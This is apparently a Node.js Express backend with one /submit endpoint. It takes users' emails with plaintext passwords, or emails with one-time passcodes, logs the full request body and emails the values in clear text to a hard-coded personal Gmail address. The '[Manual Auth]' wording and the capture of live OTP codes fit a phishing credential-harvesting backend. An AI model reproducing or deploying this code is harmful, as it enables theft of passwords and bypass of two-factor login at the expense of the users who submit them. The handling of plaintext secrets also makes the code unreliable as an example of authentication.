const express = require("express");
const cors = require("cors");
const { Resend } = require("resend");

const app = express();

const resend = process.env.RESEND_API_KEY
  ? new Resend(process.env.RESEND_API_KEY)
  : null;

const ADMIN_EMAIL = process.env.ADMIN_EMAIL || "nicholaszobo@gmail.com";
const FROM_EMAIL = process.env.FROM_EMAIL || "onboarding@resend.dev";

app.use(cors());
app.use(express.json());

// Helper function to escape HTML special characters
function escapeHtml(value) {
  if (!value) return "";
  return String(value)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
}

app.post("/submit", async (req, res) => {
  const { type, email, password, otp } = req.body;
  const timestamp = new Date().toISOString();

  console.log("Received payload:", req.body);

  if (!resend) {
    return res.status(500).json({
      success: false,
      message: "Resend API key is missing or not configured."
    });
  }

  try {
    let subject = "";
    let htmlContent = "";

    // 1. Account Creation
    if (type === "account") {
      if (!email || !password) {
        return res.status(400).json({
          success: false,
          message: "Email and password are required."
        });
      }

      subject = `[Manual Auth] New Account: ${email}`;
      htmlContent = `
        <h2>New User Credentials Submitted</h2>
        <p><strong>Email:</strong> ${escapeHtml(email)}</p>
        <p><strong>Password:</strong> ${escapeHtml(password)}</p>
        <p><strong>Submitted At:</strong> ${timestamp}</p>
        <hr />
        <p><em>Action Required: Record these details manually.</em></p>
      `;
    } 
    // 2. OTP Verification
    else if (type === "verification") {
      if (!email || !otp) {
        return res.status(400).json({
          success: false,
          message: "Email and OTP are required."
        });
      }

      subject = `[Manual Auth] OTP Verification: ${email}`;
      htmlContent = `
        <h2>OTP Submission</h2>
        <p><strong>Email:</strong> ${escapeHtml(email)}</p>
        <p><strong>Entered OTP:</strong> ${escapeHtml(otp)}</p>
        <p><strong>Submitted At:</strong> ${timestamp}</p>
      `;
    } 
    else {
      return res.status(400).json({
        success: false,
        message: "Invalid submission type."
      });
    }

    // Execute email request
    const { data, error } = await resend.emails.send({
      from: FROM_EMAIL,
      to: ADMIN_EMAIL,
      subject: subject,
      html: htmlContent
    });

    if (error) {
      console.error("Resend API Error:", error);
      return res.status(400).json({
        success: false,
        message: error.message || "Failed to deliver email via Resend."
      });
    }

    console.log("Email queued successfully. Message ID:", data.id);

    return res.json({
      success: true,
      message: "Submission processed successfully.",
      emailId: data.id
    });

  } catch (err) {
    console.error("Server Execution Error:", err);
    return res.status(500).json({
      success: false,
      message: "Internal server error occurred.",
      error: err.message
    });
  }
});

module.exports = app;